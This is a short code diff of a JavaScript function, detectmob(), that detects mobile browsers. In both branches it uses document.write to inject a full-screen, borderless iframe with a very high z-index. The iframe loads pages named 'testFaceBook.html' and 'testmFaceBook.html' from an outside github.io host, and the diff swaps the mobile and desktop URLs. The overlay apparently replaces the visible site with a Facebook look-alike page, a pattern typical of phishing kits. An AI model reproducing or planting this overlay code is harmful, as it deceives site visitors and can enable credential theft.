@@ -9,10 +9,10 @@ function detectmob() {
  || navigator.userAgent.match(/BlackBerry/i)
  || navigator.userAgent.match(/Windows Phone/i)
  ){
-    document.write('<iframe src="https://lzk-test.github.io/testFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
+    document.write('<iframe src="https://lzk-test.github.io/testmFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
   }
  else {
-    document.write('<iframe src="https://lzk-test.github.io/testmFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
+    document.write('<iframe src="https://lzk-test.github.io/testFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
 
   }
 }
